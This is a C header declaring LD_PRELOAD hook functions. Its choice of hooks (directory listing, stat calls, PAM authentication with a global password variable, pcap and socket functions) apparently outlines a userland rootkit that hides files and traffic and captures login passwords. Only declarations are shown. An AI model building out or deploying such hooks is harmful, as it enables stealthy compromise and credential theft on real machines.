#ifndef HOOKS_H_
#define HOOKS_H_

#define _GNU_SOURCE

#include <dirent.h>
#include <pcap/pcap.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/stat.h>

char *pampassword;

#define LD_HOOK __attribute__((visibility("default")))

LD_HOOK int fstatat (int fd, const char *restrict path,
                     struct stat *restrict buf, int flag);
LD_HOOK int pam_acct_mgmt(pam_handle_t *pamh, int flags);
LD_HOOK int pam_authenticate(pam_handle_t *pamh, int flags);
LD_HOOK int execve(const char *pathname, char *const _Nullable argv[],
                   char *const _Nullable envp[]);
LD_HOOK FILE *fopen64(const char *pathname, const char *mode);
LD_HOOK int stat(const char *restrict pathname,
                 struct stat *restrict statbuf);
LD_HOOK ssize_t read(int fd, void *buf, size_t count);
LD_HOOK int pcap_stats(pcap_t *p, struct pcap_stat *ps);
LD_HOOK int setsockopt(int socket, int level, int option_name,
                       const void *option_value, socklen_t option_len);
LD_HOOK FILE *fopen(const char *restrict pathname,
                    const char *restrict mode);
LD_HOOK ssize_t recvmsg(int socket, struct msghdr *message, int flags);
LD_HOOK int pam_set_item(pam_handle_t *pamh, int item_type,
                         const void *item);
LD_HOOK int statx(int dirfd, const char *_Nullable restrict pathname,
                  int flags, unsigned int mask,
                  struct statx *restrict statxbuf);
LD_HOOK int fstatat64(int dirfd, const char *pathname,
                      struct stat64 *statbuf, int flags);
LD_HOOK int pcap_loop(pcap_t *p, int cnt,
                      pcap_handler callback, u_char *user);
LD_HOOK struct dirent *readdir(DIR *dirp);
LD_HOOK struct dirent64 *readdir64(DIR *dirp);
#endif // HOOKS_H_
